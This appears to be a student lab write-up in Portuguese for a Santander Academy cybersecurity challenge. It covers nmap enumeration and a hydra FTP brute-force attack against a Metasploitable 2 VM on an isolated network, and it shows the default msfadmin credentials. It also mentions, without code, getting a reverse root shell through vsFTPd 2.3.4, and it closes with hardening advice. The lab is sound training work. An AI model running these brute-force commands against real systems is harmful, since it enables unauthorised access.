# DESAFIO_SANTANDER_ACADEMY
DESAFIO SANTANDER CIBERSEGURANÇA

INTRODUÇÂO: Este desafio tem como objetivo aplicar, em um ambiente controlado, os conceitos aprendidos nas aulas sobre ataques de força bruta e as contramedidas associadas. Para isso, foi montado um laboratório isolado composto por duas máquinas virtuais: Kali Linux, utilizada como estação de ataque/ensaio e ferramenta de auditoria; e Metasploitable 2, configurada como alvo intencionalmente vulnerável. Ambas as VMs foram conectadas em uma rede host-only no VirtualBox, garantindo que todo o tráfego permanecesse confinado ao ambiente de laboratório e não afetasse redes externas. Tambem utilizei e configurei um IDS para monitorar o acesso ftp do ataque.


1 passo - enumeração com nmap.

 sudo nmap --top-ports 1000 -sC -sV -O 192.168.56.102 -oN results.txt 
 
explicação: usei --top-ports para 1000 portas mais comuns tambei usei quis pegar versões e utilizar script NSE do nmap para enumerar possiveis vulnerabilidades, passei isso para um arquivo txt.

2 passo - identificar vetor de ataque


força bruta na porta 21. Para realizar este ataque de brute force, eu já conhecia o usuário e a senha, ambos “msfadmin”, então criei uma wordlist simples para o teste. Em um ambiente real, poderiam ser utilizadas ferramentas como Crunch e Cupp, que são excelentes para gerar wordlists de forma eficiente. 

hydra -L user.txt -P pass.txt -u 192.168.56.102 ftp

3 passo - validando acesso

Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name (192.168.56.102:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Existe uma maneira de conseguir uma shell ja que a versão do serviço ftp e vulneravel., para isso basta usar o framework metasploit e conseguir uma shell reversa com privilegios administrativos.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Observações e melhorias: atualizar serviços para versões suportadas e corrigidas, aplicar políticas de senha robustas e exigir renovação periódica de senhas pelos usuários, e realizar hardening da máquina (redução de superfície de ataque, revisão de serviços e configurações seguras). Estas medidas ajudam a reduzir significativamente o risco de exploração em ambientes de produção.

